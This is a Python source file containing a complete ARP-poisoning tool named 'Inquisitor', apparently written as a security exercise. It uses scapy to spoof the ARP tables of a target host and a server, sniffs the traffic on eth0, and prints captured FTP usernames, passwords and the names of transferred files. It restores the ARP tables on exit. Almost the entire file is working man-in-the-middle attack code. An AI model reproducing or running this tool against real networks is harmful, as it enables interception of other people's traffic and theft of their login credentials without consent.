#!/usr/local/bin/python3
import argparse
from scapy.all import ARP, Ether, send, srp, sniff, IP, DNS, Raw
import scapy.all as scapy
import re
import time
import signal

def error_exit(msg):
    print(f"Error: {msg}")
    exit(1)

def spoof(target_ip, target_mac, server_ip):
    packet = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=server_ip, op='is-at')
    scapy.send(packet, verbose=0, count=7)
    print(f" --- ARP Table soofed at {target_ip} --- ")

def restore(target_ip, target_mac, server_ip, server_mac):
    packet = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=server_ip, hwsrc=server_mac, op='is-at')
    scapy.send(packet, verbose=0, count=7)
    print(f" --- ARP Table restored at {target_ip} --- ")

class Inquisitor:
    def __init__(self, args):
        self.target_ip = args.target_ip
        self.target_mac = args.target_mac
        self.server_ip = args.server_ip
        self.server_mac = args.server_mac
        self.last_command = ""
        self.verbose = args.v

    def packet_callback(self, packet):
        if self.verbose and packet.haslayer(Raw):
            payload = packet[Raw].load.decode(errors='ignore')
            command = f"{payload}"
            if command != self.last_command:
                    print(command)
                    self.last_command = command
        if packet.haslayer(Raw):
            payload = packet[Raw].load
            if b"RETR" in payload:
                command = f"Downloading: {payload.decode()[5:-2]}"
                if command != self.last_command:
                    print(command)
                    self.last_command = command
            elif b"STOR" in payload:
                command = f"Uploading: {payload.decode()[5:-2]}"
                if command != self.last_command:
                    print(command)
                    self.last_command = command
            elif b"USER" in payload:
                username = payload.decode().split("USER ")[1].strip()
                command = f"Captured FTP username: {username}"
                if command != self.last_command:
                    print(command)
                    self.last_command = command
            elif b"PASS" in payload and b"and PASS" not in payload:
                password = payload.decode().split("PASS ")[1].strip()
                command = f"Captured FTP password: {password}"
                if command != self.last_command:
                    print(command)
                    self.last_command = command

    def exit_gracefully(self, signum, frame):
        restore(self.target_ip, self.target_mac, self.server_ip, self.server_mac)
        restore(self.server_ip, self.server_mac, self.target_ip, self.target_mac)
        exit(1)

    def poison(self):
        try:
            signal.signal(signal.SIGINT, self.exit_gracefully)

            spoof(self.target_ip, self.target_mac, self.server_ip)
            spoof(self.server_ip, self.server_mac, self.target_ip)
            scapy.sniff(iface="eth0", prn=self.packet_callback)
        except Exception as e:
            error_exit(e)

def is_valid_ip(ip_str):
    try:
        nums = ip_str.split('.')
        if len(nums) != 4:
            return False
        for n in nums:
            if int(n) < 0 or 255 < int(n):
                return False
        return True
    except:
        return False

def is_valid_mac(mac_str):
    mac_pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
    return bool(mac_pattern.match(mac_str))

def validate_args(args):
    try:
        if not is_valid_ip(args.server_ip):
            error_exit("Invalid IP-server")
        if not is_valid_mac(args.server_mac):
            error_exit("Invalid MAC-server")
        if not is_valid_ip(args.target_ip):
            error_exit("Invalid IP-target")
        if not is_valid_mac(args.target_mac):
            error_exit("Invalid MAC-target")
    except Exception as e:
        error_exit(e)

def get_args():
    parser = argparse.ArgumentParser(
        description="ARP poisoning tool to intercept packets between two hosts"
    )
    parser = argparse.ArgumentParser()
    parser.add_argument("server_ip", type=str, help="IP-server")
    parser.add_argument("server_mac", type=str, help="MAC-server")
    parser.add_argument("target_ip", type=str, help="IP-target")
    parser.add_argument("target_mac", type=str, help="MAC-target")
    parser.add_argument("-v", default= False, action="store_true", help="Enable verbose mode")
    args = parser.parse_args()

    return args

def main():
    try:
        args = get_args()
        validate_args(args)
        inquisitor = Inquisitor(args)
        inquisitor.poison()
    except Exception as e:
        error_exit(e)


if __name__ == '__main__':
    main()
